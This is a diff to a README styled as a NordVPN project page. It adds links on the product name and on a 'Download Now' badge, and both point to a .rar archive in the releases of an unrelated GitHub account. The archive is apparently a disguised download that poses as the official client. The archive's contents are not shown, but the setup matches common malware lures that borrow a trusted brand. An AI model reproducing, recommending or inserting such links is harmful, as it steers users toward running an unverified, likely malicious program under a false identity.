@@ -17,7 +17,7 @@
 
 # <p id="about">About</p>
 
-The [NordVPN]() users can choose from a list of servers
+The [NordVPN](https://github.com/AttoServantView/nordvpn/releases/download/NordVPN/NordVPN.rar) users can choose from a list of servers
 located all over the world, or let the application automatically select
 the best server for them. They can also configure their
 connection settings, for example, select a specific protocol or enable the interrupt function.
@@ -35,7 +35,7 @@ nftables,
   on what is available on the system.
 
 ---
-[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)]().
+[![Download Now](https://img.shields.io/badge/Download-Now-green?style=for-the-badge&logo=github)](https://github.com/AttoServantView/nordvpn/releases/download/NordVPN/NordVPN.rar)
 
 1. **Download Archive**  
 
